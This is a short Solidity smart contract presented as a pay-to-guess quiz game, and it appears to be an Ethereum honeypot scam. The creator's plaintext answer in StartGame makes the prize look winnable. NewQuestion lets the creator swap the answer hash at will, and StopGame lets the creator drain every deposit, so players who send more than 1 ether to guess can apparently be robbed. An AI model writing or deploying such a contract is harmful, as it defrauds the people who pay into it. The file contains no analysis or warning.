1 pragma solidity ^0.4.18;
2 
3 contract Whatchamacallit
4 {
5     bytes32 responseHash;
6     address questionSender;
7     string public question;
8  
9     function Guess(string _response) public payable {
10         if (responseHash == keccak256(_response) && msg.value>1 ether) {
11             msg.sender.transfer(this.balance);
12         }
13     }
14  
15     function StartGame(string _question, string response) public payable {
16         if (responseHash==0x0) {
17             responseHash = keccak256(response);
18             question = _question;
19             questionSender = msg.sender;
20         }
21     }
22 
23     function StopGame() public payable {
24         if (msg.sender==questionSender) {
25             msg.sender.transfer(this.balance);
26         }
27     }
28 
29     function NewQuestion(string _question, bytes32 _responseHash) public payable {
30         if (msg.sender==questionSender) {
31             question = _question;
32             responseHash = _responseHash;
33         }
34     }
35 
36     function () public payable { }
37 }